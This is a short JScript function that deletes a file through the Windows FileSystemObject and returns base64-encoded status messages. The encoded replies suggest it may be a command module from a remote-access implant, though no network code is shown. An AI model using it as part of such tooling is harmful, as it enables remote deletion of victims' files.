function delfile(path) {
    fs = new ActiveXObject("Scripting.FileSystemObject");
    if (fs.FileExists(path) == false){
        return b64e('File does not exist.');
    }
    fs.DeleteFile(path);
    return b64e('Successfully deleted file.');
}